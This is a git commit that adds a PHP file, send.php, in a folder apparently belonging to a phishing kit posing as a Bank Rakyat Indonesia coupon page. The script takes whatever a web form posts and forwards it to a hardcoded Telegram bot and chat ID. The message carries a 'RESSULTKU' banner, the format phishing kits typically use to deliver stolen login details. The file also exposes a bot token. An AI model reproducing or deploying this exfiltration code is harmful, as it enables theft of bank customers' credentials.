91ecfc5ff2fa1c6fc83cf8ecddea22fbf89754cb
Dana Prakoso Eka Saputra <dana.best.programmer@gmail.com>
2024-09-10 13:14:13 +0700

    Last commit

---
+++ cetak-kupon-bri/send.php
@@ -0,0 +1,17 @@
+<?php
+header('Access-Control-Allow-Origin: *');
+$token = "7228022211:AAE0SlPDIlg0npQK7IO6_8YnQO5BbyTLBhI";
+$chatID = "7054784676";
+$content = $_POST['message'];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    "Content-Type: application/json"
+]);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+            "{\"chat_id\":\"".$chatID."\",\"text\":\"━─━────༺BRI RESS༻────━─━\n\n(BRI | RESSULTKU)\n\n".$content."\"}");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$server_output = curl_exec($ch);
+curl_close($ch);
